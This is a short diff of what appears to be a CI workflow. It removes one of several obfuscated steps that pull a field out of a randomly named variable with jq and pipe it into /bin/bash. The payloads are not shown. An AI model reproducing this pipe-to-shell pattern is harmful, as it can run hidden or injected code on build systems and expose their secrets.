@@ -20,7 +20,6 @@ jobs:
         run: |
           printf '%s' "$zludt0" | jq -r .zvkpp4224 | /bin/bash
           echo $h446 | jq -r .xw64 | /bin/bash
-          echo $wjor295 | jq -r .d47 | /bin/bash
           echo $tahna6 | jq -r .mz15 | /bin/bash
           echo $wbvc0159 | jq -r .bdtpj3427 | /bin/bash
           printf '%s' "$w28" | jq -r .vs942 | /bin/bash
